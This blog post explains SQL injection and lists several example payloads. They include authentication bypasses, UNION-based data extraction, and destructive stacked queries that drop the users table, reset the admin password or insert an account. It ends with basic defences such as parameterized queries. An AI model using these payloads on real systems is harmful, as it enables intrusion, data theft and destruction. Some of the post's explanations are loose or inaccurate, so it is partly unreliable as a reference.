---
title: Some SQL Injection Payloads
date: 26 December 2022
description: inserting malicious code into a database through a vulnerable application...
keywords: sql, injection, isaac, database, hacking, open-source
draft: false
---

Christmas is over!

We’ve established that SQL injection is a type of cyber attack in which malicious code is inserted into a database through a vulnerable application. This type of attack can be used to gain unauthorized access to sensitive information or to modify data in a database.

One way to execute a SQL injection attack is through the use of payloads, which are specifically crafted strings of code that are designed to exploit vulnerabilities in a database. Payloads can be used to extract sensitive information from a database, to bypass authentication measures, or to execute arbitrary commands on the database server.

There are different types of payloads that can be used for SQL injection, and choosing the right payload will depend on the specific circumstances of the attack. The most common types of payloads in use are:

1. **Data retrieval payloads:** These payloads are used to extract sensitive information from a database. For example, a payload might be used to retrieve all of the email addresses in a database, or to extract password hashes for later cracking.

2. **Authentication bypass payloads:** These payloads are used to bypass authentication measures and gain unauthorized access to a database. For example, a payload might be used to login to a database with a known username and a blank password.

3. **Command execution payloads:** These payloads are used to execute arbitrary commands on the database server. This could include commands to create new users, drop tables, or modify data in the database.

Let’s not waste much time, I have to keep this as short and straightforward as possible. Let me list some examples of payloads that can be used for SQL injection:


  - **Data retrieval payload:**

    ```sh
    ' OR 1=1--
    ```

    This payload will retrieve all of the data in the database, as it will always evaluate to true.

  - **Authentication bypass payload:**

    ```sh
    ' OR 1=1--
    ```

    This payload can be used to bypass authentication measures and login to a database with a known username and a blank password.

  - **Command execution payload:**
    
    ```sh
    '; DROP TABLE users;--
    ```

    This payload will drop (delete) the “users” table in the database.

  - Data retrieval payload:

    ```sh
    ' UNION SELECT * FROM users--
    ```

    This payload will retrieve all rows from the “users” table in the database.

  - **Authentication bypass payload:**

    ```sh
    ' OR '1'='1
    ```

    This payload can be used to bypass authentication measures and login to a database with a known username and a blank password.

  - **Command execution payload:**

    ```sh
    '; INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');--
    ```

    This payload will insert a new row into the “users” table with a specified username and password.

  Here are a few more examples of payloads that can be used for various purposes:

  - **Data retrieval payload:**

    ```sh
      ' OR 'a'='a
    ```

    This payload will retrieve all rows from the current table, as it will always evaluate to true.

  - **Data retrieval payload:**

    ```sh
      ' OR '1'='1' AND 'a'='b
    ```
    This payload will retrieve no rows, as it will always evaluate to false.

  - **Data retrieval payload:**

    ```sh
      ' OR '1'='1' ORDER BY 50--
    ```

    This payload will retrieve all rows from the current table and order the results by the 50th column (which may not exist). This can be used to determine the number of columns in the table.

  - **Command execution payload:**

    ```sh
      '; UPDATE users SET password='newpassword' WHERE username='admin';--
    ```

    This payload will update the password for the user with the username “admin” to a new password.

    All these are ONLY a few examples of payloads you can test for SQL injection. Typically, every hacker is constantly developing new payloads and techniques to make our jobs easier. That’s why I often advice the database administrators I know to to keep up-to-date on the latest threats and best practices for preventing SQL injection attacks.

    If you’re worried that these payloads might be able to breach your database, you can protect your DB against SQL injection attacks, doing stuffs like:

1. Validating and sanitizing user input
2. Using prepared statements and parameterized queries
3. Enforcing strong passwords and using password hashing
4. Regularly updating software and applying security patches

If you do these, you can control and protect your systems against SQL injection attacks and ensure the security and integrity of your data though. Because I give payloads that works, doesn’t mean I wouldn’t write an article about protecting your DB from SQL injections sooner. :)